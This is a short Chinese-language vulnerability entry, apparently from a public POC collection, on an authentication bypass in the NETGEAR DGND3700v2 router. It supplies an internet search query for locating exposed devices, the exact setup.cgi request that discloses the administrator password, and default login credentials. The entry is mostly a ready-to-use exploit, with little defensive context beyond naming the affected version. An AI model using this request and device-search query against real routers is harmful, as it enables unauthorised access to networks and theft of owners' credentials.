---
fofa: "web.title="
source: "wy876 漏洞文库"
---

# NETGEAR DGND3700v2 路由器 setup.cgi 接口身份认证绕过漏洞

# 一、漏洞简介
NETGEAR DGND3700v2 是一款高效的企业路由器，NETGEAR DGND3700v2 存在身份认证绕过漏洞，攻击者可利用漏洞读取用户账号密码，访问敏感信息页面。

# 二、影响版本
+ NETGEAR DGND3700v2

# 三、资产测绘
+ hunter`web.title="DGND3700v2"`

# 四、漏洞复现
```java
/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm
```


通过上述密码登录系统

`admin/password`


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nfl28ku7srgz3zrl>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
